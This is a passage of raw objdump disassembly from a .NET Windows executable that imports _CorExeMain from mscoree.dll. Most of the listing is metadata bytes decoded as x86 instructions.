  40d4b7:	01 11                	add    %edx,(%ecx)
  40d4b9:	4c                   	dec    %esp
  40d4ba:	05 15 11 41 01       	add    $0x1411115,%eax
  40d4bf:	02 04 0a             	add    (%edx,%ecx,1),%al
  40d4c2:	01 11                	add    %edx,(%ecx)
  40d4c4:	4c                   	dec    %esp
  40d4c5:	04 07                	add    $0x7,%al
  40d4c7:	01 11                	add    %edx,(%ecx)
  40d4c9:	50                   	push   %eax
  40d4ca:	04 0a                	add    $0xa,%al
  40d4cc:	01 11                	add    %edx,(%ecx)
  40d4ce:	50                   	push   %eax
  40d4cf:	16                   	push   %ss
  40d4d0:	07                   	pop    %es
  40d4d1:	06                   	push   %es
  40d4d2:	08 12                	or     %dl,(%edx)
  40d4d4:	3c 15                	cmp    $0x15,%al
  40d4d6:	12 35 01 12 3c 11    	adc    0x113c1201,%dh
  40d4dc:	29 15 11 81 25 01    	sub    %edx,0x1258111
  40d4e2:	12 3c 12             	adc    (%edx,%edx,1),%bh
  40d4e5:	2d 05 00 00 12       	sub    $0x12000005,%eax
  40d4ea:	81 29 0a 20 03 12    	subl   $0x1203200a,(%ecx)
  40d4f0:	81 2d 02 12 81 31 1c 	subl   $0x12150d1c,0x31811202
  40d4f7:	0d 15 12 
  40d4fa:	81 35 04 02 12 81 31 	xorl   $0x81121c31,0x81120204
  40d501:	1c 12 81 
  40d504:	2d 06 20 01 01       	sub    $0x1012006,%eax
  40d509:	12 81 2d 07 15 12    	adc    0x1215072d(%ecx),%al
  40d50f:	31 01                	xor    %eax,(%ecx)
  40d511:	12 81 2d 1d 30 01    	adc    0x1301d2d(%ecx),%al
  40d517:	04 12                	add    $0x12,%al
  40d519:	11 15 12 81 35 04    	adc    %edx,0x4358112
  40d51f:	1e                   	push   %ds
  40d520:	00 12                	add    %dl,(%edx)
  40d522:	81 31 1c 12 81 2d    	xorl   $0x2d81121c,(%ecx)
  40d528:	15 12 31 01 12       	adc    $0x12013112,%eax
  40d52d:	81 2d 1e 00 1c 03 0a 	subl   $0x602010a,0x31c001e
  40d534:	01 02 06 
  40d537:	0a 02                	or     (%edx),%al
  40d539:	11 29                	adc    %ebp,(%ecx)
  40d53b:	11 40 0f             	adc    %eax,0xf(%eax)
  40d53e:	10 01                	adc    %al,(%ecx)
  40d540:	01 15 12 35 01 1e    	add    %edx,0x1e013512
  40d546:	00 15 12 51 01 1e    	add    %dl,0x1e015112
  40d54c:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40d54f:	01 12                	add    %edx,(%edx)
  40d551:	3c 09                	cmp    $0x9,%al
  40d553:	20 00                	and    %al,(%eax)
  40d555:	15 11 81 25 01       	adc    $0x1258111,%eax
  40d55a:	13 00                	adc    (%eax),%eax
  40d55c:	07                   	pop    %es
  40d55d:	15 11 81 25 01       	adc    $0x1258111,%eax
  40d562:	12 3c 1f             	adc    (%edi,%ebx,1),%bh
  40d565:	07                   	pop    %es
  40d566:	0c 08                	or     $0x8,%al
  40d568:	12 3c 12             	adc    (%edx,%edx,1),%bh
  40d56b:	3c 08                	cmp    $0x8,%al
  40d56d:	1d 05 1d 05 11       	sbb    $0x11051d05,%eax
  40d572:	29 12                	sub    %edx,(%edx)
  40d574:	3c 15                	cmp    $0x15,%al
  40d576:	11 25 01 12 3c 15    	adc    %esp,0x153c1201
  40d57c:	11 25 01 02 1d 05    	adc    %esp,0x51d0201
  40d582:	12 2d 0c 20 03 01    	adc    0x103200c,%ch
  40d588:	11 81 39 11 81 3d    	adc    %eax,0x3d811139(%ecx)
  40d58e:	11 81 41 05 20 00    	adc    %eax,0x200541(%ecx)
  40d594:	12 81 45 09 00 02    	adc    0x2000945(%ecx),%al
  40d59a:	12 11                	adc    (%ecx),%dl
  40d59c:	12 45 12             	adc    0x12(%ebp),%al
  40d59f:	81 45 06 0a 02 11 29 	addl   $0x2911020a,0x6(%ebp)
  40d5a6:	11 44 0a 0a          	adc    %eax,0xa(%edx,%ecx,1)
  40d5aa:	02 15 11 25 01 12    	add    0x12012511,%dl
  40d5b0:	3c 11                	cmp    $0x11,%al
  40d5b2:	44                   	inc    %esp
  40d5b3:	09 0a                	or     %ecx,(%edx)
  40d5b5:	02 15 11 25 01 02    	add    0x2012511,%dl
  40d5bb:	11 44 11 07          	adc    %eax,0x7(%ecx,%edx,1)
  40d5bf:	06                   	push   %es
  40d5c0:	08 12                	or     %dl,(%edx)
  40d5c2:	3c 1d                	cmp    $0x1d,%al
  40d5c4:	05 1d 05 15 11       	add    $0x1115051d,%eax
  40d5c9:	25 01 1d 05 12       	and    $0x12051d01,%eax
  40d5ce:	2d 0a 0a 02 15       	sub    $0x15020a0a,%eax
  40d5d3:	11 25 01 1d 05 11    	adc    %esp,0x11051d01
  40d5d9:	48                   	dec    %eax
  40d5da:	0d 07 05 08 12       	or     $0x12080507,%eax
  40d5df:	3c 02                	cmp    $0x2,%al
  40d5e1:	15 11 25 01 02       	adc    $0x2012511,%eax
  40d5e6:	12 2d 09 0a 02 15    	adc    0x15020a09,%ch
  40d5ec:	11 25 01 02 11 4c    	adc    %esp,0x4c110201
  40d5f2:	1a 07                	sbb    (%edi),%al
  40d5f4:	0a 08                	or     (%eax),%cl
  40d5f6:	12 3c 02             	adc    (%edx,%eax,1),%bh
  40d5f9:	1d 05 15 11 25       	sbb    $0x25111505,%eax
  40d5fe:	01 1d 05 15 11 25    	add    %ebx,0x25111505
  40d604:	01 02                	add    %eax,(%edx)
  40d606:	1d 05 08 1d 05       	sbb    $0x51d0805,%eax
  40d60b:	12 2d 09 00 02 01    	adc    0x1020009,%ch
  40d611:	12 80 c1 11 81 51    	adc    0x518111c1(%eax),%al
  40d617:	0a 0a                	or     (%edx),%cl
  40d619:	02 15 11 25 01 1d    	add    0x1d012511,%dl
  40d61f:	05 11 50 09 0a       	add    $0xa095011,%eax
  40d624:	02 15 11 25 01 02    	add    0x2012511,%dl
  40d62a:	11 50 04             	adc    %edx,0x4(%eax)
  40d62d:	07                   	pop    %es
  40d62e:	01 11                	add    %edx,(%ecx)
  40d630:	5c                   	pop    %esp
  40d631:	04 0a                	add    $0xa,%al
  40d633:	01 11                	add    %edx,(%ecx)
  40d635:	5c                   	pop    %esp
  40d636:	04 07                	add    $0x7,%al
  40d638:	01 11                	add    %edx,(%ecx)
  40d63a:	60                   	pusha
  40d63b:	04 0a                	add    $0xa,%al
  40d63d:	01 11                	add    %edx,(%ecx)
  40d63f:	60                   	pusha
  40d640:	06                   	push   %es
  40d641:	15 12 35 01 1d       	adc    $0x1d013512,%eax
  40d646:	05 0b 15 12 4d       	add    $0x4d12150b,%eax
  40d64b:	02 1d 05 15 12 51    	add    0x51121505,%bl
  40d651:	01 05 1b 10 02 02    	add    %eax,0x202101b
  40d657:	15 12 51 01 1e       	adc    $0x1e015112,%eax
  40d65c:	01 15 12 51 01 1e    	add    %edx,0x1e015112
  40d662:	00 15 12 4d 02 1e    	add    %dl,0x1e024d12
  40d668:	00 15 12 51 01 1e    	add    %dl,0x1e015112
  40d66e:	01 05 0a 02 1d 05    	add    %eax,0x51d020a
  40d674:	05 04 07 01 12       	add    $0x12010704,%eax
  40d679:	54                   	push   %esp
  40d67a:	04 07                	add    $0x7,%al
  40d67c:	01 1d 05 0c 00 05    	add    %ebx,0x5000c05
  40d682:	01 12                	add    %edx,(%edx)
  40d684:	80 c1 08             	add    $0x8,%cl
  40d687:	12 80 c1 08 08 04    	adc    0x40808c1(%eax),%al
  40d68d:	07                   	pop    %es
  40d68e:	01 11                	add    %edx,(%ecx)
  40d690:	68 04 0a 01 11       	push   $0x11010a04
  40d695:	68 04 07 01 11       	push   $0x11010704
  40d69a:	6c                   	insb   (%dx),%es:(%edi)
  40d69b:	04 0a                	add    $0xa,%al
  40d69d:	01 11                	add    %edx,(%ecx)
  40d69f:	6c                   	insb   (%dx),%es:(%edi)
  40d6a0:	0f 07                	sysret
  40d6a2:	06                   	push   %es
  40d6a3:	08 12                	or     %dl,(%edx)
  40d6a5:	58                   	pop    %eax
  40d6a6:	1d 05 08 15 11       	sbb    $0x11150805,%eax
  40d6ab:	25 01 08 12 2d       	and    $0x2d120801,%eax
  40d6b0:	04 00                	add    $0x0,%al
  40d6b2:	00 11                	add    %dl,(%ecx)
  40d6b4:	49                   	dec    %ecx
  40d6b5:	06                   	push   %es
  40d6b6:	15 11 81 5d 01       	adc    $0x15d8111,%eax
  40d6bb:	05 08 20 03 01       	add    $0x1032008,%eax
  40d6c0:	1d 13 00 08 08       	sbb    $0x8080013,%eax
  40d6c5:	12 00                	adc    (%eax),%al
  40d6c7:	03 15 12 39 01 08    	add    0x8013912,%edx
  40d6cd:	12 45 15             	adc    0x15(%ebp),%al
  40d6d0:	11 81 5d 01 05 11    	adc    %eax,0x1105015d(%ecx)
  40d6d6:	81 61 05 15 12 39 01 	andl   $0x1391215,0x5(%ecx)
  40d6dd:	08 05 15 11 25 01    	or     %al,0x1251115
  40d6e3:	08 09                	or     %cl,(%ecx)
  40d6e5:	0a 02                	or     (%edx),%al
  40d6e7:	15 11 25 01 08       	adc    $0x8012511,%eax
  40d6ec:	11 5c 17 07          	adc    %ebx,0x7(%edi,%edx,1)
  40d6f0:	09 08                	or     %ecx,(%eax)
  40d6f2:	12 58 1d             	adc    0x1d(%eax),%bl
  40d6f5:	05 08 15 11 25       	add    $0x25111508,%eax
  40d6fa:	01 08                	add    %ecx,(%eax)
  40d6fc:	11 81 65 11 81 65    	adc    %eax,0x65811165(%ecx)
  40d702:	11 29                	adc    %ebp,(%ecx)
  40d704:	12 2d 03 20 00 08    	adc    0x8002003,%ch
  40d70a:	09 0a                	or     %ecx,(%edx)
  40d70c:	02 15 11 25 01 08    	add    0x8012511,%dl
  40d712:	11 60 09             	adc    %esp,0x9(%eax)
  40d715:	00 02                	add    %al,(%edx)
  40d717:	11 81 65 11 49 11    	adc    %eax,0x11491165(%ecx)
  40d71d:	49                   	dec    %ecx
  40d71e:	03 20                	add    (%eax),%esp
  40d720:	00 0d 06 20 01 01    	add    %cl,0x1012006
  40d726:	1d 13 00 06 0a       	sbb    $0xa060013,%eax
  40d72b:	02 11                	add    (%ecx),%dl
  40d72d:	29 11                	sub    %edx,(%ecx)
  40d72f:	60                   	pusha
  40d730:	15 07 0a 08 12       	adc    $0x12080a07,%eax
  40d735:	58                   	pop    %eax
  40d736:	02 1d 05 05 08 1d    	add    0x1d080505,%bl
  40d73c:	05 1d 05 15 11       	add    $0x1115051d,%eax
  40d741:	25 01 08 12 2d       	and    $0x2d120801,%eax
  40d746:	05 20 02 01 0e       	add    $0xe010220,%eax
  40d74b:	0e                   	push   %cs
  40d74c:	09 0a                	or     %ecx,(%edx)
  40d74e:	02 15 11 25 01 08    	add    0x8012511,%dl
  40d754:	11 68 16             	adc    %ebp,0x16(%eax)
  40d757:	07                   	pop    %es
  40d758:	09 08                	or     %ecx,(%eax)
  40d75a:	12 58 1d             	adc    0x1d(%eax),%bl
  40d75d:	05 1d 05 08 1d       	add    $0x1d08051d,%eax
  40d762:	05 12 54 15 11       	add    $0x11155412,%eax
  40d767:	25 01 1d 05 12       	and    $0x12051d01,%eax
  40d76c:	2d 0a 0a 02 15       	sub    $0x15020a0a,%eax
  40d771:	11 25 01 1d 05 11    	adc    %esp,0x11051d01
  40d777:	6c                   	insb   (%dx),%es:(%edi)
  40d778:	04 07                	add    $0x7,%al
  40d77a:	01 11                	add    %edx,(%ecx)
  40d77c:	74 04                	je     0x40d782
  40d77e:	20 01                	and    %al,(%ecx)
  40d780:	0e                   	push   %cs
  40d781:	0e                   	push   %cs
  40d782:	05 20 02 0e 0e       	add    $0xe0e0220,%eax
  40d787:	0e                   	push   %cs
  40d788:	04 0a                	add    $0xa,%al
  40d78a:	01 11                	add    %edx,(%ecx)
  40d78c:	74 04                	je     0x40d792
  40d78e:	00 01                	add    %al,(%ecx)
  40d790:	01 02                	add    %eax,(%edx)
  40d792:	0d 07 03 12 2d       	or     $0x2d120307,%eax
  40d797:	15 11 81 25 01       	adc    $0x1258111,%eax
  40d79c:	12 3c 12             	adc    (%edx,%edx,1),%bh
  40d79f:	3c 03                	cmp    $0x3,%al
  40d7a1:	20 00                	and    %al,(%eax)
  40d7a3:	1c 04                	sbb    $0x4,%al
  40d7a5:	07                   	pop    %es
  40d7a6:	01 11                	add    %edx,(%ecx)
  40d7a8:	29 18                	sub    %ebx,(%eax)
  40d7aa:	07                   	pop    %es
  40d7ab:	0a 08                	or     (%eax),%cl
  40d7ad:	02 0e                	add    (%esi),%cl
  40d7af:	0e                   	push   %cs
  40d7b0:	11 29                	adc    %ebp,(%ecx)
  40d7b2:	15 11 25 01 02       	adc    $0x2012511,%eax
  40d7b7:	15 11 25 01 12       	adc    $0x12012511,%eax
  40d7bc:	3c 12                	cmp    $0x12,%al
  40d7be:	2d 08 12 2d 04       	sub    $0x42d1208,%eax
  40d7c3:	00 00                	add    %al,(%eax)
  40d7c5:	12 5d 05             	adc    0x5(%ebp),%bl
  40d7c8:	00 01                	add    %al,(%ecx)
  40d7ca:	01 12                	add    %edx,(%edx)
  40d7cc:	5d                   	pop    %ebp
  40d7cd:	06                   	push   %es
  40d7ce:	20 01                	and    %al,(%ecx)
  40d7d0:	01 12                	add    %edx,(%edx)
  40d7d2:	81 75 04 00 01 02 0e 	xorl   $0xe020100,0x4(%ebp)
  40d7d9:	06                   	push   %es
  40d7da:	00 01                	add    %al,(%ecx)
  40d7dc:	12 81 7d 0e 05 00    	adc    0x50e7d(%ecx),%al
  40d7e2:	02 01                	add    (%ecx),%al
  40d7e4:	0e                   	push   %cs
  40d7e5:	0e                   	push   %cs
  40d7e6:	07                   	pop    %es
  40d7e7:	20 03                	and    %al,(%ebx)
  40d7e9:	01 02                	add    %eax,(%edx)
  40d7eb:	0e                   	push   %cs
  40d7ec:	10 02                	adc    %al,(%edx)
  40d7ee:	06                   	push   %es
  40d7ef:	0a 02                	or     (%edx),%al
  40d7f1:	11 29                	adc    %ebp,(%ecx)
  40d7f3:	11 74 09 0a          	adc    %esi,0xa(%ecx,%ecx,1)
  40d7f7:	02 15 11 25 01 02    	add    0x2012511,%dl
  40d7fd:	11 74 08 00          	adc    %esi,0x0(%eax,%ecx,1)
  40d801:	03 12                	add    (%edx),%edx
  40d803:	11 12                	adc    %edx,(%edx)
  40d805:	45                   	inc    %ebp
  40d806:	0e                   	push   %cs
  40d807:	08 0a                	or     %cl,(%edx)
  40d809:	0a 02                	or     (%edx),%al
  40d80b:	15 11 25 01 12       	adc    $0x12012511,%eax
  40d810:	3c 11                	cmp    $0x11,%al
  40d812:	74 05                	je     0x40d819
  40d814:	20 01                	and    %al,(%ecx)
  40d816:	12 55 03             	adc    0x3(%ebp),%dl
  40d819:	05 20 01 12 55       	add    $0x55120120,%eax
  40d81e:	0e                   	push   %cs
  40d81f:	04 20                	add    $0x20,%al
  40d821:	00 12                	add    %dl,(%edx)
  40d823:	55                   	push   %ebp
  40d824:	05 07 01 11 80       	add    $0x80110107,%eax
  40d829:	88 05 15 11 41 01    	mov    %al,0x1411115
  40d82f:	0e                   	push   %cs
  40d830:	05 0a 01 11 80       	add    $0x8011010a,%eax
  40d835:	88 0a                	mov    %cl,(%edx)
  40d837:	07                   	pop    %es
  40d838:	06                   	push   %es
  40d839:	0e                   	push   %cs
  40d83a:	18 08                	sbb    %cl,(%eax)
  40d83c:	12 55 09             	adc    0x9(%ebp),%dl
  40d83f:	12 69 05             	adc    0x5(%ecx),%ch
  40d842:	00 01                	add    %al,(%ecx)
  40d844:	12 69 08             	adc    0x8(%ecx),%ch
  40d847:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40d84d:	d5 0a                	aad    $0xa
  40d84f:	3a 0f                	cmp    (%edi),%cl
  40d851:	07                   	pop    %es
  40d852:	05 15 12 35 01       	add    $0x1351215,%eax
  40d857:	0e                   	push   %cs
  40d858:	12 81 91 12 81 99    	adc    -0x667eed6f(%ecx),%al
  40d85e:	0e                   	push   %cs
  40d85f:	0e                   	push   %cs
  40d860:	05 15 12 35 01       	add    $0x1351215,%eax
  40d865:	0e                   	push   %cs
  40d866:	05 20 00 12 81       	add    $0x81120020,%eax
  40d86b:	95                   	xchg   %eax,%ebp
  40d86c:	05 20 00 12 81       	add    $0x81120020,%eax
  40d871:	99                   	cltd
  40d872:	05 20 00 12 81       	add    $0x81120020,%eax
  40d877:	9d                   	popf
  40d878:	04 20                	add    $0x20,%al
  40d87a:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40d87d:	0f 07                	sysret
  40d87f:	05 0e 12 81 91       	add    $0x9181120e,%eax
  40d884:	12 81 95 12 81 99    	adc    -0x667eed6b(%ecx),%al
  40d88a:	12 81 a1 03 07 01    	adc    0x10703a1(%ecx),%al
  40d890:	0e                   	push   %cs
  40d891:	03 00                	add    (%eax),%eax
  40d893:	00 08                	add    %cl,(%eax)
  40d895:	05 00 00 12 81       	add    $0x81120000,%eax
  40d89a:	a9 03 20 00 0a       	test   $0xa002003,%eax
  40d89f:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40d8a4:	1c 0a                	sbb    $0xa,%al
  40d8a6:	07                   	pop    %es
  40d8a7:	05 1d 05 12 55       	add    $0x5512051d,%eax
  40d8ac:	1d 05 08 05 06       	sbb    $0x6050805,%eax
  40d8b1:	20 01                	and    %al,(%ecx)
  40d8b3:	1d 05 1d 05 05       	sbb    $0x5051d05,%eax
  40d8b8:	20 02                	and    %al,(%edx)
  40d8ba:	0e                   	push   %cs
  40d8bb:	08 08                	or     %cl,(%eax)
  40d8bd:	05 07 01 11 80       	add    $0x80110107,%eax
  40d8c2:	8c 05 0a 01 11 80    	mov    %es,0x8011010a
  40d8c8:	8c 05 07 01 11 80    	mov    %es,0x80110107
  40d8ce:	94                   	xchg   %eax,%esp
  40d8cf:	05 0a 01 11 80       	add    $0x8011010a,%eax
  40d8d4:	94                   	xchg   %eax,%esp
  40d8d5:	05 07 01 11 80       	add    $0x80110107,%eax
  40d8da:	98                   	cwtl
  40d8db:	05 0a 01 11 80       	add    $0x8011010a,%eax
  40d8e0:	98                   	cwtl
  40d8e1:	05 07 01 11 80       	add    $0x80110107,%eax
  40d8e6:	a0 05 0a 01 11       	mov    0x11010a05,%al
  40d8eb:	80 a0 05 07 01 11 80 	andb   $0x80,0x11010705(%eax)
  40d8f2:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40d8f3:	05 0a 01 11 80       	add    $0x8011010a,%eax
  40d8f8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40d8f9:	05 07 01 11 80       	add    $0x80110107,%eax
  40d8fe:	a8 05                	test   $0x5,%al
  40d900:	15 11 41 01 09       	adc    $0x9014111,%eax
  40d905:	05 0a 01 11 80       	add    $0x8011010a,%eax
  40d90a:	a8 05                	test   $0x5,%al
  40d90c:	07                   	pop    %es
  40d90d:	01 11                	add    %edx,(%ecx)
  40d90f:	80 80 06 10 01 01 08 	addb   $0x8,0x1011006(%eax)
  40d916:	1e                   	push   %ds
  40d917:	00 05 0a 01 11 80    	add    %al,0x8011010a
  40d91d:	80 0b 07             	orb    $0x7,(%ebx)
  40d920:	04 08                	add    $0x8,%al
  40d922:	0e                   	push   %cs
  40d923:	15 11 25 01 0e       	adc    $0xe012511,%eax
  40d928:	12 2d 05 15 12 65    	adc    0x65121505,%ch
  40d92e:	01 0e                	add    %ecx,(%esi)
  40d930:	0f 10 01             	movups (%ecx),%xmm0
  40d933:	01 15 12 39 01 1e    	add    %edx,0x1e013912
  40d939:	00 15 12 65 01 1e    	add    %dl,0x1e016512
  40d93f:	00 0a                	add    %cl,(%edx)
  40d941:	0a 02                	or     (%edx),%al
  40d943:	15 11 25 01 0e       	adc    $0xe012511,%eax
  40d948:	11 80 88 0c 07 04    	adc    %eax,0x4070c88(%eax)
  40d94e:	08 12                	or     %dl,(%edx)
  40d950:	3c 15                	cmp    $0x15,%al
  40d952:	11 25 01 02 12 2d    	adc    %esp,0x2d120201
  40d958:	0a 0a                	or     (%edx),%cl
  40d95a:	02 15 11 25 01 02    	add    0x2012511,%dl
  40d960:	11 80 8c 1a 07 0d    	adc    %eax,0xd071a8c(%eax)
  40d966:	0e                   	push   %cs
  40d967:	12 69 0e             	adc    0xe(%ecx),%ch
  40d96a:	1d 0e 15 12 35       	sbb    $0x3512150e,%eax
  40d96f:	01 0e                	add    %ecx,(%esi)
  40d971:	08 08                	or     %cl,(%eax)
  40d973:	1d 0e 08 1d 0e       	sbb    $0xe1d080e,%eax
  40d978:	12 69 12             	adc    0x12(%ecx),%ch
  40d97b:	81 c1 0e 05 20 00    	add    $0x20050e,%ecx
  40d981:	12 81 c5 05 20 00    	adc    0x2005c5(%ecx),%al
  40d987:	12 81 c9 06 20 01    	adc    0x12006c9(%ecx),%al
  40d98d:	1d 0e 1d 03 05       	sbb    $0x5031d0e,%eax
  40d992:	20 01                	and    %al,(%ecx)
  40d994:	08 13                	or     %dl,(%ebx)
  40d996:	00 09                	add    %cl,(%ecx)
  40d998:	20 02                	and    %al,(%edx)
  40d99a:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40d99f:	81 d5 0b 00 02 12    	adc    $0x1202000b,%ebp
  40d9a5:	81 c1 11 81 d9 11    	add    $0x11d98111,%ecx
  40d9ab:	81 dd 07 20 02 12    	sbb    $0x12022007,%ebp
  40d9b1:	81 c1 0e 02 04 20    	add    $0x2004020e,%ecx
  40d9b7:	00 1d 0e 07 07 03    	add    %bl,0x307070e
  40d9bd:	08 11                	or     %dl,(%ecx)
  40d9bf:	29 12                	sub    %edx,(%edx)
  40d9c1:	2d 07 00 01 12       	sub    $0x12010007,%eax
  40d9c6:	11 12                	adc    %edx,(%edx)
  40d9c8:	81 e1 07 0a 02 11    	and    $0x11020a07,%ecx
  40d9ce:	29 11                	sub    %edx,(%ecx)
  40d9d0:	80 94 07 0a 02 11 29 	adcb   $0x11,0x2911020a(%edi,%eax,1)
  40d9d7:	11 
  40d9d8:	80 98 05 00 01 1d 05 	sbbb   $0x5,0x1d010005(%eax)
  40d9df:	0e                   	push   %cs
  40d9e0:	06                   	push   %es
  40d9e1:	20 01                	and    %al,(%ecx)
  40d9e3:	01 11                	add    %edx,(%ecx)
  40d9e5:	81 e9 07 00 01 12    	sub    $0x12010007,%ecx
  40d9eb:	69 12 81 c5 07 07    	imul   $0x707c581,(%edx),%edx
  40d9f1:	03 0e                	add    (%esi),%ecx
  40d9f3:	12 81 c1 02 05 20    	adc    0x200502c1(%ecx),%al
  40d9f9:	02 01                	add    (%ecx),%al
  40d9fb:	0e                   	push   %cs
  40d9fc:	1c 0b                	sbb    $0xb,%al
  40d9fe:	07                   	pop    %es
  40d9ff:	04 08                	add    $0x8,%al
  40da01:	02 15 11 25 01 02    	add    0x2012511,%dl
  40da07:	12 2d 05 15 12 65    	adc    0x65121505,%ch
  40da0d:	01 02                	add    %eax,(%edx)
  40da0f:	0a 0a                	or     (%edx),%cl
  40da11:	02 15 11 25 01 02    	add    0x2012511,%dl
  40da17:	11 80 a0 09 07 05    	adc    %eax,0x50709a0(%eax)
  40da1d:	08 02                	or     %al,(%edx)
  40da1f:	0e                   	push   %cs
  40da20:	11 29                	adc    %ebp,(%ecx)
  40da22:	12 2d 05 00 01 0e    	adc    0xe010005,%ch
  40da28:	1d 0e 07 0a 02       	sbb    $0x20a070e,%eax
  40da2d:	11 29                	adc    %ebp,(%ecx)
  40da2f:	11 80 a4 04 20 01    	adc    %eax,0x12004a4(%eax)
  40da35:	02 0e                	add    (%esi),%cl
  40da37:	0b 07                	or     (%edi),%eax
  40da39:	04 08                	add    $0x8,%al
  40da3b:	09 15 11 25 01 09    	or     %edx,0x9012511
  40da41:	12 2d 05 15 12 65    	adc    0x65121505,%ch
  40da47:	01 09                	add    %ecx,(%ecx)
  40da49:	03 0a                	add    (%edx),%ecx
  40da4b:	01 09                	add    %ecx,(%ecx)
  40da4d:	0a 0a                	or     (%edx),%cl
  40da4f:	02 15 11 25 01 09    	add    0x9012511,%dl
  40da55:	11 80 a8 80 da 00    	adc    %eax,0xda80a8(%eax)
	...
  40da63:	00 9e da 00 00 00    	add    %bl,0xda(%esi)
  40da69:	20 00                	and    %al,(%eax)
	...
  40da7f:	00 90 da 00 00 00    	add    %dl,0xda(%eax)
	...
  40da91:	00 5f 43             	add    %bl,0x43(%edi)
  40da94:	6f                   	outsl  %ds:(%esi),(%dx)
  40da95:	72 45                	jb     0x40dadc
  40da97:	78 65                	js     0x40dafe
  40da99:	4d                   	dec    %ebp
  40da9a:	61                   	popa
  40da9b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40daa2:	72 65                	jb     0x40db09
  40daa4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40daa8:	6c                   	insb   (%dx),%es:(%edi)
  40daa9:	00 00                	add    %al,(%eax)
  40daab:	00 00                	add    %al,(%eax)
  40daad:	00 ff                	add    %bh,%bh
  40daaf:	25 00 20 40 00       	and    $0x402000,%eax
